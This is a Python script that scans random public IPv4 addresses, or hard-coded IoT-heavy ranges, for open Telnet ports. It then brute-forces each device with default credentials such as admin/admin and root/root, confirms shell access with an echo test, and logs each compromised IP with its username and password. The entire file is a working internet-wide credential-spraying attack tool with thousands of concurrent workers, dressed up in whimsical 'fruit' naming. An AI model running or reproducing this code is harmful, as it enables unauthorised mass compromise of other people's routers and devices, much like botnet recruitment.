#!/usr/bin/env python3
import asyncio
import aiofiles
import random
import ipaddress
import socket
import multiprocessing as mp
import time
import sys
import argparse
import signal  # ✅ Explicitly imported
from colorama import init, Fore, Style

# >> Init colors uwu <<
init(autoreset=True)

# >> Parse arguments <<
parser = argparse.ArgumentParser(description="🍑 ULTRA-MEGA-FRUIT-TWIN-SPRAY-X10000++ GOD MODE v4 (Timeout-Proof + Multi-Check)")
parser.add_argument("--iot", action="store_true", help="Use pre-loaded IoT IP ranges (streaming mode)")
args = parser.parse_args()

# >> Config <<
OUTPUT_FILE = "telnet_success.txt"
NUM_PROCESSES = max(1, mp.cpu_count())
WORKERS_PER_PROC = 3000
TIMEOUT = 2.5
REFRESH_RATE = 0.1
SHARED_COUNTER = mp.Manager().dict()
SHARED_COUNTER["scanned"] = 0
SHARED_COUNTER["open"] = 0
SHARED_COUNTER["bruted"] = 0
SHARED_COUNTER["success"] = 0

# >> Default credentials <<
CREDENTIALS = [
    ("admin", "admin"), ("root", "root"), ("admin", "password"),
    ("root", "admin"), ("user", "user"), ("guest", "guest"),
    ("support", "support"), ("root", "12345"), ("admin", "1234"), ("root", "")
]

# >> IoT Ranges <<
IOT_RANGES = [
    "1.0.1.0/24", "1.1.1.0/24", "1.1.3.0/24", "1.1.9.0/24",
    "10.0.0.0/8", "100.64.0.0/10", "172.16.0.0/12", "192.168.0.0/16",
    "180.0.0.0/8", "183.0.0.0/8", "113.0.0.0/8", "121.0.0.0/8",
    "218.0.0.0/8", "222.0.0.0/8", "223.0.0.0/8", "211.0.0.0/8",
    "58.0.0.0/8", "59.0.0.0/8", "60.0.0.0/8", "61.0.0.0/8",
    "112.0.0.0/8", "114.0.0.0/8", "115.0.0.0/8", "116.0.0.0/8",
    "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8", "120.0.0.0/8",
    "123.0.0.0/8", "124.0.0.0/8", "125.0.0.0/8", "126.0.0.0/8",
]

# Convert to networks
iot_networks = []
if args.iot:
    print(f"{Fore.CYAN}[🔍] Loading IoT ranges (streaming mode)... {len(IOT_RANGES)} blocks")
    for net_str in IOT_RANGES:
        try:
            iot_networks.append(ipaddress.IPv4Network(net_str, strict=False))
        except Exception as e:
            print(f"{Fore.RED}[⚠️] Failed to parse {net_str}: {e}")
    print(f"{Fore.GREEN}[✅] Loaded {len(iot_networks)} IoT networks!")

# 🍓🍉🍍 **FRUIT FUNCTIONS (UwU Daddy Mode)** 🍍🍉🍓

def lychee():
    """Generate random public IP."""
    while True:
        ip = ipaddress.IPv4Address(random.randint(0, (1 << 32) - 1))
        if ip.is_global:
            return str(ip)

def peach():
    """Generate random IP from IoT ranges."""
    if not iot_networks:
        return lychee()
    try:
        network = random.choice(iot_networks)
        if network.prefixlen >= 24:
            ip_int = random.randint(int(network.network_address), int(network.broadcast_address))
        else:
            net_int = int(network.network_address)
            host_max = min(65536, network.num_addresses)
            ip_int = net_int + random.randint(1, host_max - 1)
        return str(ipaddress.IPv4Address(ip_int))
    except:
        return lychee()

async def mango(ip, port=23, timeout=TIMEOUT):
    """Check if Telnet port is open (timeout-safe)."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=min(2.0, timeout)
        )
        writer.close()
        await writer.wait_closed()
        return True
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False
    except:
        return False

async def read_all(reader, timeout=1.0, chunk_delay=0.2):
    """Read all available data until silence or timeout."""
    data = b""
    start = time.time()
    while (time.time() - start) < timeout:
        try:
            part = await asyncio.wait_for(reader.read(1024), timeout=1.0)
            if not part:
                break
            data += part
            await asyncio.sleep(chunk_delay)
        except asyncio.TimeoutError:
            break
        except:
            break
    return data

async def check_prompt_shell(data):
    """Check if shell prompt is present."""
    shell_indicators = [b'#', b'>', b'$', b'~#', b']~', b'root@', b'admin@', b'uid=', b'id=']
    return any(ind in data.lower() for ind in shell_indicators)

async def check_welcome_banner(data):
    """Check for welcome messages that suggest post-login."""
    welcome_words = [b'welcome', b'last login', b'linux', b'busybox', b'embedded', b'kernel']
    return any(word in data.lower() for word in welcome_words)

async def check_command_echo(reader, writer):
    """Send echo command and verify response."""
    test_str = b"FRUIT_BLESS_YOU_" + str(random.randint(1000, 9999)).encode()
    try:
        writer.write(b"echo " + test_str + b"\r\n")
        await writer.drain()

        response = await read_all(reader, timeout=2.0, chunk_delay=0.1)
        return test_str in response
    except:
        return False

async def kiwi(ip):
    """Attempt brute-force with multi-check login detection."""
    for user, pwd in CREDENTIALS:
        start_time = time.time()
        time_left = TIMEOUT - (time.time() - start_time)
        if time_left <= 0:
            continue

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, 23),
                timeout=time_left
            )
        except:
            continue

        # —————— PHASE 1: Read initial banner ——————
        try:
            banner = await read_all(reader, timeout=1.0)
            if not banner:
                writer.close()
                await writer.wait_closed()
                continue
        except:
            writer.close()
            await writer.wait_closed()
            continue

        # Flag: did any check pass?
        success = False

        # —————— CHECK 1: Welcome/Login in banner ——————
        if not success:
            try:
                if await check_welcome_banner(banner):
                    # Might already be in shell? Try command
                    if await check_command_echo(reader, writer):
                        success = True
            except:
                pass

        # —————— CHECK 2: Normal login flow ——————
        if not success:
            try:
                # Look for login prompt
                login_words = [b'login', b'username', b'login:', b'Username:']
                if not any(w in banner.lower() for w in login_words):
                    writer.close()
                    await writer.wait_closed()
                    continue

                # Send username
                writer.write((user + "\r\n").encode("utf-8", errors="ignore"))
                await writer.drain()

                # Read after username
                time_left = TIMEOUT - (time.time() - start_time)
                if time_left <= 0:
                    writer.close()
                    await writer.wait_closed()
                    continue
                data = await read_all(reader, timeout=time_left)

                # If "Password:" not found, maybe already in shell?
                if b"password" not in data.lower() and await check_prompt_shell(data):
                    if await check_command_echo(reader, writer):
                        success = True

                # Else, send password
                if not success:
                    writer.write((pwd + "\r\n").encode("utf-8", errors="ignore"))
                    await writer.drain()

                    time_left = TIMEOUT - (time.time() - start_time)
                    if time_left <= 0:
                        writer.close()
                        await writer.wait_closed()
                        continue
                    final_data = await read_all(reader, timeout=time_left)

                    # Check 1: Shell prompt
                    if not success and await check_prompt_shell(final_data):
                        success = True

                    # Check 2: Run echo command
                    if not success:
                        if await check_command_echo(reader, writer):
                            success = True
            except:
                pass

        # —————— LOG SUCCESS IF ANY CHECK PASSED ——————
        if success:
            result = f"{ip} {user}:{pwd}"
            async with aiofiles.open(OUTPUT_FILE, "a") as f:
                await f.write(result + "\n")
            print(f"{Fore.LIGHTGREEN_EX}[😻 SUCCESS] {result}")
            SHARED_COUNTER["success"] += 1
            writer.close()
            await writer.wait_closed()
            return True

        # Clean up
        try:
            writer.close()
            await writer.wait_closed()
        except:
            pass

        await asyncio.sleep(0.01)
    return False

async def durian():
    """Main worker."""
    ip = peach() if args.iot else lychee()
    if await mango(ip):
        SHARED_COUNTER["open"] += 1
        await kiwi(ip)
        SHARED_COUNTER["bruted"] += 1
    SHARED_COUNTER["scanned"] += 1

# 🌈✨ **FANCY RAINBOW STATS DASHBOARD** ✨🌈
def rainbow_text(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    return ''.join(colors[i % len(colors)] + char for i, char in enumerate(text))

def clear_line():
    sys.stdout.write('\033[K')

def display_stats():
    start = time.time()
    while not stop_event.is_set():
        clear_line()
        s = SHARED_COUNTER["scanned"]
        o = SHARED_COUNTER["open"]
        b = SHARED_COUNTER["bruted"]
        x = SHARED_COUNTER["success"]
        elapsed = time.time() - start
        rate = s / (elapsed + 1e-6)

        stat_line = (
            f"{rainbow_text('💖 ULTRA-FRUIT-SPRAY-X10000++ GOD MODE v4 ')}"
            f"{Fore.CYAN}rPid: {s:,} "
            f"{Fore.YELLOW}Open: {o:,} "
            f"{Fore.GREEN}Brute: {b:,} "
            f"{Fore.RED}Hits: {x:,} "
            f"{Fore.MAGENTA}Rate: {rate:,.0f}/s"
        )
        sys.stdout.write(f"\r{stat_line}")
        sys.stdout.flush()
        time.sleep(REFRESH_RATE)

# 💥 **WORKER PROCESS**
def worker_process(counter):
    global SHARED_COUNTER
    SHARED_COUNTER = counter

    async def batch_loop():
        while not stop_event.is_set():
            tasks = [durian() for _ in range(100)]
            await asyncio.gather(*tasks, return_exceptions=True)

    try:
        asyncio.run(batch_loop())
    except:
        pass

# 🚨 **SHUTDOWN HANDLER**
stop_event = mp.Event()

def signal_handler(signum, frame):
    print(f"\n\n{Fore.LIGHTRED_EX}[🛑] Uwu daddy stopped... paws go sleep~ 😴")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# 🏁 **MAIN ENTRY**
if __name__ == "__main__":
    print(f"{Fore.LIGHTMAGENTA_EX}🍑 Starting ULTRA-MEGA-FRUIT-TWIN-SPRAY-X10000++ GOD MODE v4... 🍉")
    print(f"{Fore.CYAN}  » {NUM_PROCESSES} processes × {WORKERS_PER_PROC} paws = {NUM_PROCESSES * WORKERS_PER_PROC} paws!")
    print(f"{Fore.YELLOW}  » Mode: {'IoT Streaming IPs' if args.iot else 'Random Global IPs'}")
    print(f"{Fore.GREEN}  » Live stats: Scanned | Open | Bruted | Success | Rate\n")

    # Start stats display
    stats_thread = mp.Process(target=display_stats, daemon=True)
    stats_thread.start()

    # Start worker processes
    processes = []
    for _ in range(NUM_PROCESSES):
        p = mp.Process(target=worker_process, args=(SHARED_COUNTER,), daemon=True)
        p.start()
        processes.append(p)

    try:
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()

    stop_event.set()
    for p in processes:
        p.join(timeout=1)
    print(f"\n{Fore.LIGHTBLUE_EX}[✅] Scan complete. Hits saved to {OUTPUT_FILE}")
